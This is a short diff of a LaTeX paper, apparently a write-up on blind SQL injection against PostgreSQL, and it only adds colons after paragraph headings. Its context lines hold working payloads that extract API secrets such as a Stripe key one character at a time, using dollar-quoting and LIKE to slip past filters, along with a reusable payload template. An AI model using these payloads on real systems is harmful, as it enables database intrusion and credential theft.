@@ -304,12 +304,14 @@ multiple rows (e.g., listing multiple schema or table names). Without
 \lstinline|LIMIT 1|, a subquery returning multiple rows will cause a runtime error
 and prevent extraction.
 
-\paragraph{Correct payload:}
+\paragraph{Correct payload:}:
+
 \begin{lstlisting}
 (SELECT substr(secret,1,1) FROM secret_vault.api_keys WHERE service LIKE $_$stripe$_$) = w
 \end{lstlisting}
 
-\paragraph{Broken payload (internal \texttt{=} confuses split\_part):}
+\paragraph{Broken payload (internal \texttt{=} confuses split\_part):}:
+
 \begin{lstlisting}
 (SELECT substr(secret,1,1) FROM secret_vault.api_keys WHERE service = $_$stripe$_$) = w
 \end{lstlisting}
@@ -687,12 +689,14 @@ format() function.} \url{https://www.postgresql.org/docs/17/} (accessed
 \appendix
 \section{Quick Reference}
 
-\paragraph{Payload Template.}
+\paragraph{Payload Template.}:
+
 \begin{lstlisting}
 (SELECT substr(COLUMN,POSITION,1) FROM SCHEMA.TABLE WHERE KEY LIKE $_$VALUE$_$) = CHAR
 \end{lstlisting}
 
-\paragraph{ASCII Fallback for Stripped Characters.}
+\paragraph{ASCII Fallback for Stripped Characters.}:
+
 \begin{lstlisting}
 (SELECT ascii(substr(COLUMN,POSITION,1)) FROM SCHEMA.TABLE WHERE KEY LIKE $_$VALUE$_$) = 45
 \end{lstlisting}
